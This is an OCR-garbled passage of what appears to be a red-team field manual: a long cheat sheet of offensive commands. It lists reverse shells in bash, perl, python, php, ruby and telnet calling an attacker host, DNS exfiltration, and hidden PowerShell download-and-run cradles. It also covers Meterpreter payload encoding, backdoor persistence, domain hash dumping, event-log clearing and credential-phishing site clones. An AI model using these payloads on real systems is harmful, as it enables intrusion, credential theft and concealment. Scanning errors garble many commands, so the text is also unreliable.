\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022.\u2022.\u2022\u2022\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022.\u2022\u2022\u2022\u2022.\u2022...\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022. 72\nPROGRAMMING ............................................................................................................................................ 76\nWIRELESS ..\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022.....\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022. 84\nREFERENCES \u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022\u2022..\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022 94\nINDEX \u2022\u2022\u2022\u2022...\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022..\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022. 95\n'-)'''M\u00abV#ffr'ZW\u00a511i!f--wiiMfM'M'WMi'\"\"f%ffi!I'''IW\"\"liH;:-~@\nfor x in {1 .. 254 .. l};do ping -c 1 l.l.l.$x lgrep \"64 b\" lcut -d\" \"-f4\nfor ip in {1 .. 254 .. 1}; do dig -x l.l.l.$ip I grep $ip\n# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2\n# It assumes 1 is the router and does not ban IPs .20, .21, .22\n11.1} J A}. J, I A J. 11 A A .1. /.). J. I 1 J.} J.\nI A I I I.) 1 .I A).. A .l. J. J.} .I),).. J.}.}).. J. A A; J, J,. J.ll\nSet up script in crontab to callback ever} X minutes.\nset up a generic user on red team computer (with no shell privs).\nwill use the private kej (located on callback source computer) to connect\nto a public key (on red team computer). Red teamer connects to target via a\nlocal SSH session (in the example below, use #ssh -p4040 localhost)\nCallbac~: script located on callback source computer (target)\n\"/home/$(REMUSR}/.ssh/id rsa\" -N $(LIVEHOST} -1 $(REMUSR}\niptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d\niptables -t nat -A POSTROUTING -p tcp -i ethC -j SNAT -s\nALLOW ONLY 1.1.1. 0/24, PORTS 80,443 AND LOG DROPS TO\niptables -A INPU~ -s 1.1.1.0/24 -m state --state RELATED,ESTAB~ISHED,NEW\niptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT\nLOGGING -m limit --limit 4/min -j LOG --log-prefix \"DROPPED \"\n\u2022 Available in Linux distributions such as Red Hat Enterprise Linux (RHEL),\nconvert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg\nCAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE\ntcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24\n# Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs\nuser= user ,pass= pass ,sec=ntlrnssp,domain= domain ,rw\nWindows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)\nWindows Server 2008 (Foundation, Standard, Enterprise)\nWindows Server 2008 R2 (Foundation, Standard, Enterprise)\nWindows Server 2012 (Foundation, Essentials, Standard)\n%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n%SystemDrive%\\Users\\%UserName%\\AppData\\Roaming\\Microsoft\\Windows\\Start\n%SystemDrive%\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\n%SystemDrive%\\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\Startup\nnetsh interface portproxy add v4tov4 listenport=3000\nlistenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2\nnetsh interface portproxy delete v4tov4 listenport=3000\nreg add HKCU\\Software\\Policies\\t1icrosoft\\Windows\\System /v DisableCHD /t\nEXECUTE FILE HOSTED ON REMOTE SYSTEM WITH SPECIFIED CREDENTIALS\nHKEY LOCAL t1ACHINE\\SYSTEH\\CurrentControlSet \\Control\\ TerminalService\nreg add \"HKEY LOCAL t1ACHINE\\SYSTEH\\CurentControlSet\\Control \\Terminal\nTUNNEL RDP OUT PORT 443 (MAY NEED TO RESTART TERMINAL SERVICES)\nREG ADD \"HKLt1\\System\\CurrentControlSet\\Control \\Terminal\nServer\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 443 /f\nreg add \"HKEY LOCAL t1ACHINE\\SYSTEt1\\CurentControlSet\\Control \\Terminal\nServer\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\nnetsh firewall set service type = remotedesktop mode = enable\nschtasks.exe /create /tn t1yTask /xml \"C:\\l1yTask.xml\" /f\n[alias] == process, share, startup, service, nicconfig, useraccount, etc.\n[where] ==where (name=\"cmd.exe\"), where (parentprocessid!=[pid]\"), etc.\n[clause] ==list [fulllbrief], get [attribl, attrib2], call [method],\nEXECUTE FILE HOSTED OVER SMB ON REMOTE SYSTEM WITH SPECIFIED\nwmic product where name= 11XXX\" call uninstall /nointeractive\nwmic /node:remotecomputer computersystern get username\nwmic /node:\"machinename 4\" path Win32_TerminalServiceSetting where\nAllowTSConnections=''O'' call SetAllowTSConnections ''1''\nwmic netlogin where (name like \"%adm%\") get numberoflogons\nwmic service get narne,displayname,pathnarne,startrnode lfindstr /i nauton\nIf anJ copies alread1 ex~st then exfil, otherwise create using\nfollowing commands. Check output.txt for anJ errors\ncall create \"cmd /c vssadmin create shadow /for=C: 2 &1\n\\\\?\\GLOBALROOT\\Device\\HarddiskVol~meShadowCopy1\\Windows\\System32\\co\n/user: \"DOl'.llUN\\user\" /password: 11 PASS\" process\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyc\\NTDS\\NTDS.dit\nStep bj step instructions o~ roorn362.com for step below\nFrom Linux, download and run ntdsxtract and libesedb to export\nAdditional instructions found under the VSSOW~ section\nCLEAR SECURITY & APPLCIATION EVENT LOG FOR REMOTE SERVER(S~Ol)\nClear-EventLog -logname Application, Security -computername SVR01\nGet-WmiObject -class win32 operatingsjstem I select -property\nNew-PSJrive -Persist -PSProvider FileSjstem -Root \\\\1.1.1.1\\tools -Name i\nGet-Childitem -Path c:\\ -Force -Rec~rse -Filter '.log -ErrorAction\nSilentl~Con~inue I where {$ .LastWriteTime -gt ''2012-08-20''}\n(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'')\n$ports=(#,#,#) ;$ip=\"x.x.x.x\";foreach ($port in $ports) {trJ($socket=New-\nobject Sjste~.Net.Sockets.TCPClient($ip,$port); }catch(};if ($socket -eq\n$NULL) (echo $ip\":\"$port\"- Closed\";}else(echo $ip\":\"$port\"- Open\";$socket\n$ping = New-Object Sjstex.Net.Networkinformation.ping\npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass\n$Host.UI.PromptForCredential( 11 title \", 11 message\nRUN EXE EVERY 4 HOURS BETWEEN AUG 8-11 , 2 013 AND THE HOURS OF\npowershell. exe -Command \"do {if ((Get-Date -format yyyyl1l1dd-HHmm) -match\n'201308 ( 0 [ 8-9] 11 [0-1])- I 0 [ 8-9] 11 [ o-c]) [ 0-5] [ 0-9]') {Start-Process -\nWindowStyle Hidden \"C:\\Temp\\my.exe\";Start-Sleep -s 14400))while(1)\"\n$pw ~ convertto-securestring -string \"PASSWORD\" -asplaintext -force;\n$pp ~ new-object -typename System.Management.Automation.PSCredential -\nStart-Process powershell -Credential $pp -ArgumentList '-noprofile -command\npowershell.exe Send-l-1ai1Hessage -to \" email \" -from \" email \" -subject\n\"Subject 11 -a \" attachment file path \" -body \"Body\" -SmtpServer\nTURN ON POWERSHELL REMOTING (WITH VALID CREDENTIALS)\nl1icrosoftDNS _ ResourceRecord -Filter \"domainname~' DOl1AIN '\" I select\nPOWERSHELL DOWNLOAD OF A FILE FROM A SPECIFIED LOCATION\n\"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback\n{$true); $source~\"\"\"https:ll YOUR SPECIFIED IP I file.zip \"\"\";\n$destination= 111111C:\\rnaster.zip 111111 ;-$http = new-object Systern.Net.WebClient;\n$response~ $http.DownloadFile($source, $destination);\"\nScript will send a file ($filepath) via http to server ($server) via POST\nMust have web server listening on port designated in the $server\n\"[S;stem.Net.ServicePointManager] ::ServerCertificateValidationCallback\n{$true); $server~\"\"\"http:ll YOUR SPECIFIED IP I folder \"\"\";\n$filepath=\" 1111C:\\rnaster.zip 111111 i $http= new=object System.Net.WebClient;\nNeed Metasploit v4.5+ (msfvenom supports Powershell)\nUse Powershell (x86) with 32 bit Meterpreter payloads\nencodeMeterpreter.psl script can be found on next page\n./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86\nMove audit.psl into same folder as encodeMeterpreter.psl\npowershell.exe -executionpolicy bypass encodeMeterpreter.psl\n$action = [IO.Compression.CompressionMode]: :Compress\n$cs =New-Object IO.Compression.DeflateStream ($ms,$action)\n$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding] ::ASCII)\n$command= \"Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object\nIO. Compression. DeflateStream ('$(New-Object IO. t4emoryStream\n(, '$ ( [Convert] : : FromBase64String ('\"$code'\") ) I I ,\n$bytes= [System.Text.Encoding] ::Unicode.GetBytes($command)\n$encodedCommand = [Convert]: :ToBase64String($bytes)\nCopyright 2012 TrustedSec, LLC. All rights reserved.\nUSING POWERSHELL TO LAUNCH METERPRETER (2ND METHOD)\nrnsfpajload windows/rneterpreter/reverse tcp LHOST~10.1.1.1\n$crnd ~ ' PASTE THE CONTENTS OF THE PSH SCRIPT HERE\n$u ~ [Sjstern.Text.Encoding]: :Unicode.GetBytes($crnd)\nON TARGET SHELL ( 1 : DOWNLOAD SHELLCODE, 2 : EXECUTE)\npowershell -noprofile -noninteracti ve -command \" &\nSjstern.Net.WebClient;$client.DownloadFile('http://1.1.1.1/shell.txt\npowershell -noprofile -noninteracti ve -noexi t -command\n{$crnd~tjpe 'c:\\windows\\ternp\\ shell.txt';powershell -noprofile-\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v InstallDate\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v RegisteredOwner\nHKLM\\Software\\~icrosoft\\Windows NT\\CurrentVersion /v SjstemRoot\nHKLM\\Sjstem\\CurrentControlSet\\Control\\TimeZoneinformation /v ActiveTirneBias\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive\nHKEY_LOCAL_~ACHI~E\\SYSTEM\\CurrentControlSet\\Services\\Tcp~p\\Parameters -\nHKCU\\Soft\\v~re \\t1icroso ft \\Windows NT\\CurrentVersion \\Winlogon \\autoadminlogon\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentControlSet\\Services\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\nHKCU\\Software\\Microsoft\\Windows\\Curren~Version\\Explorer\\ComDlg32\\LastVisite\nHKCU\\Software\\Microsoft\\Internet Explorer\\TjpedURLs\nHKCU\\ Software \\:ci erose ft \\Windows\\ Cur rentVer s ion\\ Explorer \\Runt1RU\nHKCU\\Software\\l1icrosoft\\Windows\\CurrentVersion\\Applets\\RegEdit /v LastKeJ\nHKLl1\\Soft'..;are \\t1icroso:t \\ 1/'Jindows \\CurrentVers on \\Run & \\Runonce\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVers on\\Policies\\Explorer\\Run\nHKCU\\Software\\Microsoft\\Windows\\CurrentVers on\\Run & \\Runonce\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load & \\Run\ndsadd user ''CN=Bob,CN=Users,DC=victim,DC=corn'' -samid bob -pwd bobpass-\ndisplaj \"Bob 11 -pwdneverexpires jes -rnemberof \"CI';=Domain\ndsrm -subtree -noprornpt ''CN=Bob,CN=Users,DC=victim,DC=com''\ndsquerJ A ''DC=victim,DC=com'' -scope subtree -attr ''en''\n11 (& (objectclass=computer) (objectcategorJ=computer) (operatingSjstem=Windows}\n\" (& (objectCategory~Computer) (objectClass~Computer) (operatingSystem~'Server'\nJ ''CN=Sites,CN=Configuration,DC=forestRootDomain'' -filter\n) If scripting in batch file, variables must be preceeded with %%, i.e. %%i\nfor /L %i in (10,1,254) do@ (for /L %x in (10,1,254) do@ ping -n 1 -w 100\nfor /F %n in (names.txt) do for /F %pin (pawds.txt) do net use \\\\DC01\\IPC$\nfor /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\\\WIN-\nin (2,1,254) do (netsh interface ip set address local static\nIT 1 S A DIRECTORY, FILE DATE/TIME, RELATIVE PATH, ACTUAL PATH AND\nforfi1es /P c:\\ternp /s /rn pass' -c \"crnd /c echo @isdir @fdate @ftirne\nfor /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n\nfor /L %C in (1,1,5000) do @for %U in (www.Jahoo.com www.pastebin.com\nwww.pajpal.com www.craigslist.org www.google.com) do start /b iexplore %U &\nfor /f ''tokens=2 delims='=''' %a in ('wmic service list full lfind /i\ndelims = '' %a in (c:\\windows\\temp\\3afd4ga.tmp) do cmd.exe\nfor /L %i in (2,1,254) do shutdown /r /m \\\\l.l.l.%i /f /t 0 /c \"Reboot\nSHELL ESCALATION USING VBS (NEED ELEVATED CREDENTIALS)\nSet shell ' wscript.createobject(''wscript.shell'')\nC:\\Windows\\SJstem32\\WindowsPowershell\\vl.O\\powershell.exe -WindowStJle\nhidden -NoLogo -~onlnteractive -ep bjpass -nop -c \\'' & '''''''' & ''IEX ((New-\nObject Net.WEbClieil':).down:oadstring(' url '))\\\" & \"\"\"\" & \"\"\"\"\n' Scheduled tasks binary paths CANNOT contain spaces because everjthing\nafter the first space in the path is considered to be a command-line\nargument. Enclose the /TR path parameter between backslash (\\) AND\nTASK SCHEDULER (ST=START TIME, SD=START DATE, ED=END DATE)\n\"C:\\Windows\\sjswow64\\WindowsPowerShell\\vl.O\\powershell.exe\"\n\"C:\\Windows\\System32\\WindowsPowerShell\\vl.O\\powershell.exe -WindowStyle\nhidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object\nnet.webclient) .downloadstring( ''http:// ip : port I payload'''))'\" /SC\n\"C:\\Windows\\System32\\WindowsPowerShell\\vl.O\\powershell.exe -WindowStjle\nhidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object\nnet.webclient) .downloadstring(''http:// ip : port I payload'''))'\" /SC\n\"C:\\Windows\\System32\\WindowsPowerShell\\vl.O\\powershell.exe -WindowStyle\nhidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object\nnet.webclient) .downloadstring(''http:// ip : port I payload'''))'\" /SC\nsocat TCP-LISTEN:8080,reuseaddr,fork TCP6: [2001: :] :80\nCAPTURE TRAFFIC TO SPECIFIC IP EXCLUDING SPECIFIC SUBNET\n\"$3)==\"Nrnap scan report\")print$5\" \"$6}' I sed 's/(//g' I sed 's/)//g'\nEttercap filter to drop IPSEC traffic IUDP port 5001\nREG KEY TO HAVE PuTTY LOG EVERYTHING (INCLUDING CONVERSATIONS)\n[HKEY_CURRENT_USER\\Software\\Si~onTatham\\Putt;\\Sessions\\Default%20Settings]\nforb in 'cat fole.hex '; do dig $b.shell.evilexample.com; done\ntcdpump -w /tmp/dns -sO port 53 and host sjstem.example.com\nOn attacker (capture pac~ets to data.dmp and parse}:\nNETCAT (* START LISTENER ON ATTACK BOX TO CATCH SHELL)\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234\n$i~\"10.0.0.l\"; $p~1234; socket(S,PF INET, SOCK STREAt1,\ngetprotobjname(\"tcp\") I; if(connect(S,sockaddr in($p,inet-aton($i) I iT!\nopen(STDIN,\" &S\") ;open(STDOUT,\" &S\"); open(ST~ERR,\" &8\"17 exec(\"/bin/sh-\nIO: :Socket: :INET(PeerAddr,\"attackerip:4444\") ;STDIN- fdopen($c,r) ;$--\nperl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN-\npython -c 'import socket, subprocess, os; s=socket. socket (socket .. ;;F _ INET,\nsocket.SOCK_STREAL1); s.connect( (\"10.0.0.1\",1234)); os.dup2 (s.fileno() ,0);\nphp -r '$sod:~fsockopen(\"10.0.0.1\", 1234) ;exec(\"/bin/sh -i\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234) .to i; exec\nfork;c=TCPSocket.new(\"attackerip\",\"4444\");while(crnd=c.gets);IO.popen(cmd,\n'c=TCPSocket.new(\"attacY..erip\",\"4444\");while(crnd=c.gets);IO.popen{cmd,\"r 11 ) {I\nrm -f /tmp/p; mknod /tmp/p p && telnet attacl:erip 4444 0/tmp/p\ntelnet attacl:erip 4444 I /bin/bash I telnet attackerip 4445\nWINDOWS TASK SCHEDULER PERSISTENCE (START TASK SCHEDULER)\nREG add HKEY CURRENT USER\\Software\\l1icrosoft\\Windows\\CurrentVersion\\Run\n/v firewall 7t REG SZ /d \"c:\\windows\\system32\\backdoor.exe\" /f\nat 19:00 /every:t1,T,W,Th,F cmd /c start \"%USERPROFILE%\\backdoor.exe\"\nSCHTASKS /Create /RU \"SYSTEt1\" /SC l1INUTE /t10 45 /TN FIREWALL /TR\nFrom the compromised machine, share the payload folder\nUse psexec or wmic command to remotely execute payload\nUse psexec or wmic command to remotely execute payload\nLISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2\nproxjchains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2\nLISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2\nnmap -sP -n -oX out.xml 1.1.1.0/24 2.2.2.0/24 I grep \"Nmap\" I cut -d \" \" -f\nTCP Port Scanner in port range [startPort] to [endPort]:\n# Use cvlc (command line VLC) on target to mitigate popups\nCAPTURE AND STREAM THE SCREEN OVER UDP TO <ATTACKER:IP>: 1234\n# Start a listener that stores the stream in a file.\nvlc udp://@:1234 :sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,\nab=128,channels=2,samplerate=44100):file{dst=test.mp4) :no-sout-rtp-sap\n# This may make the users screen flash. Lower frame rates delay the video.\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):udp{dst= attackerip :1234) :no-sout-rtp-sap :no-sout-\n# Start a listener that stores the stream to a file\nsout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,samp\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):http{mux=ffmpeg{mux=flv),dst=:8080/) :no-sout-rtp-sap :no-\n# Start a listener on attacker machine for multicast\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):udp{dst= multicastaddr :1234) :no-sout-rtp-sap :no-sout-\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):file{dst=C:\\\\Program Files (x86)\\\\VideoLAN\\\\VLC\\\\test.mp4)\n:no-sout-rtp-sap :no-sout-standard-sap :ttl=1 :sout-keep\nvlc dshow:// :dshow-vdev= 11None\" :dshow-adev=\"Your Audio Device 11\nIf already in ssh session, press SHIFT -C to configure tunnel\nSETUP Xll FORWARDING FROM TARGET, FROM ATTACK BOX RUN\nREMoTE PORT FORWARD ON 808 0 , FORWARD TO ATTACKER ON 4 43\nLoCAL PORT FORWARD ON PORT 8080 ON ATTACK BOX AND FORWARDS\nTHROUGH SSH TUNNEL TO PORT 3300 ON INTERNAL TARGET 3. 3. 3. 3\nDYNAMIC TUNNEL USED IN CONJUNCTION WITH PROXYCHAINS . ENSURE\n/ETC/PROXYCHAINS. CONF IS CONFIGURED ON CORRECT PORT (1080)\nCREATE ENCODED METERPRETER PAYLOAD (FOR LINUX: -T ELF -o\n./msfpayload windows/meterpreter/reverse tcp LHOST~ ip\n./msfencode -t exe -o callback.exe -e x86/shikata_ga nai -c 5\n./msfpayload windows/meterpreter/bir.d_tcp RP.OST~ ip\nCREATE ENCODED PAYLOAD USING MSFVENOM USING EXE TEMPLATE\n./msfvenorn --payload windows/meterpreter/reverse~tcp --format exe\ntemplate calc.exe -k --encoder x86/shikata ga nai -i 5\nPASS A SHELL (BY DEFAULT WJ:LL LAUNCH NOTEPAD AND :INJECT)\nIMPERSONATE TOKEN (DROP TOKEN WILL STOP IMPERSONATING)\nclient. railgun. user32. t.jessageBoxA ( 0, \"got\", 11 JOU\", \"HB ~OK\")\nGRUB Henu:Add 'single' end of kernel line. Reboot. Change root pass. reboot\n# For --format~netlmv2 replace $NETLM with $NETLMv2\n$NETLt1$112233445566\"\"88$0836F0858124F338958-5F81951905DD2F85252CC-318825\nusername:$NETLt1$ll2233445566\"\"88$0836F0858124F338958\"5F81951905DD2F85252CC\"\nusername:$NETLt1$112233445566\"\"88$0836F0858124F338958-5F81951905DD2F85252CC\"\n# Exactly 36 spaces between USER and HASH (SAP8 and SAPG)\n$SHA1p$salt$59b3e8d63-cf9\"edbe2384cf59cb\"453dfe30-89\nusername:$SHA1p$salt$59b3e8d63-cf9\"edbe2384cf59cb-453dfe30-89\n#Add lower(@), upper(,), ~umber(%), and symbol( I to the end of the word\nUse custom special character set and add 2 numbers then special character\nmaskprocessor -custom-charset1~\\!\\@\\#\\$ baseword?d?d?l\nDownload: http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopj[X]\\windows\\\n\\\\?\\GLOBALROOT\\Device\\Harddisf:VolumeShadowCopj[X]\\windows\\\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopj[X]\\windows\\\nDownload tools: http://www.ntdsx~ract.com/downloads/ntds dump_hash.zip\nConfigure and Make source code for libesedb from the extracted package\nUse esedbdumphash to ex~ract the datatable from ntds.dit.\n8a.Use dsdump.pj to dump hashes from datatable using bootkej from\n8b.Use bkhive and samdump2 to dump hashes from SN1 using bootkej from\n# dig +short [t1D51 SHA-1] .malware.hash.cjmrc.J.com TXT\nConvert timestamp= perl-e 'print scalar localtime( timestamp ) , ''\\n'''\n!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\"\n//Site refresh=window.setTimeout(function() {window.location.href='http://ww\nframe src=''/e'' frarneborder=O scrolling=no noresize=noresize ;,\napplet archive=''legit.jar'' code=''This is a legit applet'' width=''l''\niframe src=\"http://1.1.1.1 11 width=\"O\" height=\"O\" frameborder=\"O\"\ntabindex=''-1'' title=''ernpty'' style=visibility:hidden;display:none''\nwget -q --save-cookies=cookie.txt --keep-session-cookies --post-\ndata=\"username: admin&password=pass&Login=Login\" http: I I .. url ,. I login. php\ncurl -I -X HEAD -A \"t~ozilla/5.0 (compatible; HSIE \".01; Windows NT 5.0)\"\nThe steps below will clone a website and redirect after 3 seconds to\nanother page requiring basic authentication. It has proven very useful for\ncollecting credentials during social engineering engagements.\nThrough SET, use the 'Website Attack Vector' menu to clone your\nIn a new terminal create a new directory (lowercase L)\ncd /pentest/exploits/set/src/web clone/site/template/\nCreate blank password file to be used for basic auth\nwget http://wkhtmltopdf.googlecode.com/files/wkhtmltoimage-0.11.0 rc1-\ntar -jxvf wkhtmltoimage-0.11.0 rc1-statlc-i386.tar.bz2\ngit clone git://github.com/SpiderLabs/Nmap-Tools.git\ncp http-screenshot.nse /usr/local/share/nmap/scripts/\nOS/version detection using screenshot script (screenshots saved as .png):\nScript will generate HTML preview page with all screenshots:\nls -1 '.png I awk -F : ' {print $1\":\"$2\"\\n BR- IMG SRC=\\\"\"$1\"%3A\"$2\"\\\"\nhttps://phantomjs.googlecode.com/files/phantomjs-1.9.2-linux-x86_64.tar.bz2\ngit clone https://bitbucket.org/LaNMaSteR53/peepingtom.git\nExtract and copy phantomjs from phantomjs-1.9.2-linux-x86 64.tar.bz2 and\n./sqlmap.py -u \"http:// url \" --data=\"id=1&str=val\"\nSQL INJECTION AGAINST SPECIFIC PARAMETER WITH DB TYPE SPECIFIED\n./sqlmap.py -u ''http:// url '' --data=''id=l&str=val'' -p ''id''\nLogin and note cookie value (cookie1=val1, cookie2=val2)\n./sqlrnap.py -u ''http://\u00b7 url '' --data=''id=l&str=val'' -p ''id''\nSQL INJECTION AND COLLECT DB VERSION 1 NAME 1 AND USER\n./sqlmap.py -u \"http:// url \" --data=\"id=1&str=val\" -p \"id\" -b --current-db\n./sqlmap.py -u \"http:// url \" --data=\"id=1&str=val\" -p \"id\" --tables -D\n./sqlrnap.py -u \"http:// url \" --data=\"id=l&str=val\" -p \"id 11 --columns -T\nSELECT TOP 1 TABLE NAME FROl1 INFORl1ATION SCHEt1A. TABLES\nSELECT name, password hash FROM master.sjs.sgl logins\nSELECT relname, A.attnaxe FROl1 pg_class c, pg_namespace N, pg_attribute A,\n(A.attrelid-C.oid) AND (A.atttjpid-T.oid) AND (A.attnum 0) AND\nSELECT c.relname FROM pg_catalog.pg_class cLEFT JOIN\n( 'r','') AND n.nspnarne NOT IN ( 'pg catalog', 'pg toast') AND\nSELECT table schema, table name, column_ name FR0t1\ntable schema != 'rnysql' AND table schema != 'information schema'\n-U sa -P pwd -Q \"exec xp cmdshell 'net user /add user\nSELECT DISTINCT grantee FR0t1 dba SfS_prlvS WHERE ADlHN OPTION\nCONVERT WINDOWS REGISTRY HEX FORMAT TO READABLE ASCII\nmessage= re.findall(r' message (.'?) /message ', data,re.DOTALL)\nprint ''File %s contains %s'' % (str(msg) ,message)\nopenssl req -new -x509 -keyout cert.pem -out cert.pern -days 365 -nodes\nhttpd ~ BaseHTTPServer.HTTPServer( ('192.168.1.10' ,443),\nhttpd.socket = ssl.wrap socket(httpd.socket,certflle=cert,server side=True)\nPYTHON EMAJ:L SENDER ( * SENDMAJ:L MUST BE INSTALLED)\nLOOP THROUGH IP LIST, DOWNLOAD FILE OVER HTTP AND EXECUTE\nPYTHON HTTP BANNER GRABBER (* TAKES AN IP RANGE, PORT, AND\nparser.add option{''-t'', dest=''iprange'',help=''target IP range, i.e.\nparser.add option(''-p'', dest=''port'',default=''80'',help=''port, default=BO'')\nparser.add=option(\"-d\", dest=\"delay\",default=\".5\",help=\"delay (in seconds),\nips.append('%s.%s.%s.%d' % (octets[O],octets[1] ,octets[2],i))\nresponse= urllib2.urlopen('http://%s:%s' % (ip,opts.port))\nprint '%s : %s' % (header,headers[header] .get('server'))\n* When you craft TCP packets with Scapy, the underlying OS will not\nrecognize the initial SYN packet and will reply with a RST packet. To\nmitigate this you need to set the following Iptables rule:\niptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP\nsr ( IPv6 ( src=\" ipv6 n' dst=\".ipv6 n I /ICHP (I I\ndst=\" ip 